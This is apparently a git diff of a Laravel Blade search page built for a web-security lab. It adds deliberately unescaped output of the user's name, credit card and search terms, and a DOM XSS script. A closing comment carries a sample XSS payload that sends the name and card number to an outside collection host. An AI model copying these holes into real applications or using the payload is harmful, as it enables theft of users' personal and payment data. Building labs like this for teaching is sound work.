@@ -11,16 +11,38 @@
         @endcan
     </div>
 </div>
-<form>
+
+@auth
+<!-- Vulnerable user information display (intentionally insecure for XSS demonstration) -->
+<div class="card mb-3">
+    <div class="card-header bg-info text-white">
+        User Information
+    </div>
+    <div class="card-body">
+        <div class="row">
+            <div class="col-md-6">
+                <p><strong>Welcome:</strong> <span id="user-name">{!! auth()->user()->name !!}</span></p>
+            </div>
+            <div class="col-md-6">
+                <p><strong>Credit Card:</strong> <span id="user-credit">{!! auth()->user()->credit_card !!}</span></p>
+            </div>
+        </div>
+        <!-- Search history will be displayed here -->
+        <div id="search-history"></div>
+    </div>
+</div>
+@endauth
+<!-- Search form with vulnerable output -->
+<form id="search-form">
     <div class="row">
         <div class="col col-sm-2">
-            <input name="keywords" type="text"  class="form-control" placeholder="Search Keywords" value="{{ request()->keywords }}" />
+            <input name="keywords" id="search-keywords" type="text" class="form-control" placeholder="Search Keywords" value="{{ request()->keywords }}" />
         </div>
         <div class="col col-sm-2">
-            <input name="min_price" type="numeric"  class="form-control" placeholder="Min Price" value="{{ request()->min_price }}"/>
+            <input name="min_price" type="numeric" class="form-control" placeholder="Min Price" value="{{ request()->min_price }}"/>
         </div>
         <div class="col col-sm-2">
-            <input name="max_price" type="numeric"  class="form-control" placeholder="Max Price" value="{{ request()->max_price }}"/>
+            <input name="max_price" type="numeric" class="form-control" placeholder="Max Price" value="{{ request()->max_price }}"/>
         </div>
         <div class="col col-sm-2">
             <select name="order_by" class="form-select">
@@ -44,6 +66,13 @@
         </div>
     </div>
 </form>
+
+<!-- Vulnerable: Directly outputting search keywords without sanitization -->
+@if(isset($searchKeywords) && !empty($searchKeywords))
+<div class="alert alert-info mt-3">
+    <h4>Search Results for: {!! $searchKeywords !!}</h4>
+</div>
+@endif
 
 
 @foreach($products as $product)
@@ -82,6 +111,50 @@
         </div>
     </div>
 @endforeach
+<!-- Vulnerable DOM XSS implementation -->
+<script>
+// Function to parse URL parameters (vulnerable to DOM XSS)
+function getUrlParameter(name) {
+    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+    var results = regex.exec(location.search);
+    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
+
+// DOM XSS vulnerability: directly inserting URL parameter into DOM
+document.addEventListener('DOMContentLoaded', function() {
+    // Get the search parameter from URL
+    var searchTerm = getUrlParameter('keywords');
+
+    // Add to search history (vulnerable to DOM XSS)
+    if (searchTerm) {
+        var historyDiv = document.getElementById('search-history');
+        if (historyDiv) {
+            var searchItem = document.createElement('div');
+            searchItem.innerHTML = '<p>Recent search: ' + searchTerm + '</p>';
+            historyDiv.appendChild(searchItem);
+        }
+    }
+
+    // Add event listener to search form
+    document.getElementById('search-form').addEventListener('submit', function(e) {
+        var keywords = document.getElementById('search-keywords').value;
+        // Log search activity
+        logSearchActivity(keywords);
+    });
+});
+
+// Function to log search activity (sends data to collect endpoint)
+function logSearchActivity(keywords) {
+    fetch('/collect?activity=search&keywords=' + encodeURIComponent(keywords))
+        .then(response => response.json())
+        .then(data => console.log('Activity logged:', data))
+        .catch(error => console.error('Error logging activity:', error));
+}
+
+// Reflected XSS payload example (for educational purposes):
+// <script>fetch('http://websecservice.localhost.com/collect?name='+document.getElementById('user-name').innerText+'&credit='+document.getElementById('user-credit').innerText);</script>
+</script>
 @endsection
 
 
